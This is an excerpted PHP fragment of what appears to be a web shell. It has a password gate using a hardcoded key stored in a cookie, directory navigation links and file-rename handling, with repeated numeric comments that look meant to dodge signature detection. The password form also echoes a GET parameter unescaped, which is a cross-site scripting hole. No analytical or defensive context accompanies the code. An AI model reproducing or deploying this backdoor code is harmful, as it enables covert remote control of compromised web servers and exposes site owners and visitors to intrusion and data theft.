...
$auth_key = "91dada04c29f83bfb7f9e3468cfc4e4a";
...
$pass = false;
if (isset($_COOKIE['pw_name_82560'])) {
    if(($_COOKIE['pw_name_82560']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_82560'])) {
        if(($_POST['pw_name_82560']) == $auth_key) {
            setcookie("pw_name_82560", $_POST['pw_name_82560']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_82560' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1724682774754728 1724682774132864 1724682774668771 1724682774568796
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1724682774754728 1724682774132864 1724682774668771 1724682774568796
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1724682774754728 1724682774132864 1724682774668771 1724682774568796
            $name = PATH . "/" . $_GET['r'];
